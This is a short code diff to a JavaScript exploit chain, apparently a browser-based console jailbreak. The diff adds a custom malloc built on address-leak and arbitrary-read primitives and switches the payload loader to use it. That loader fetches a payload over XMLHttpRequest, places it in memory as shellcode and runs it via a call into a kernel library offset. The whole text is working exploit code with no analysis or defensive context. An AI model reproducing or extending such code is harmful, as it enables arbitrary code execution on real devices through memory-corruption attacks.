@@ -1507,6 +1507,13 @@ function array_from_address(addr, size) {
         nogc.push(og_array);
         return og_array;
     }
+   function malloc(sz) {
+        var backing = new Uint8Array(0x10000 + sz);
+        window.nogc.push(backing);
+        var ptr = p.read8(p.leakval(backing).add32(0x10));
+        ptr.backing = backing;
+        return ptr;
+    }
 
  function loadPayload(){
  var req = new XMLHttpRequest();
@@ -1524,7 +1531,7 @@ function array_from_address(addr, size) {
    tmp.set(padding, req.response.byteLength);
    var shellcode = new Uint32Array(tmp.buffer);
    pl.set(shellcode,0);
-   var pthread = p.malloc(0x10);
+   var pthread = malloc(0x10);
    chain.call(libKernelBase.add32(0x00025510), pthread, 0x0, payload_buffer, 0);
 
   }
